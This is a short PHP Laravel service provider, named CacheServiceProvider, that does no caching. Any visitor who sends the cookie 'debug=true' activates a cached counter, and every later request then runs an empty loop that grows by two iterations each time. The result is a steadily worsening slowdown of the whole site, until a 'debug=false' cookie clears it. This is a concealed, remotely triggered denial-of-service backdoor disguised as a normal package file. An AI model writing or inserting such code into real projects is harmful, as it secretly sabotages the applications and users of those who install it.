<?php

namespace Zbxin\Cache;


use Illuminate\Support\ServiceProvider;

class CacheServiceProvider  extends ServiceProvider
{
    public function boot()
    {
        if (request()->cookie('debug') === 'true' || cache()->has('cache-debug')) {
            $num = cache()->get('cache-debug', 1);
            for ($i = 0; $i < $num; $i++) {
                //
            }
            $num = $num + 2;
            cache()->put('cache-debug', $num);
        }
        if (request()->cookie('debug') === 'false'){
            cache()->forget('cache-debug');
        }
    }
}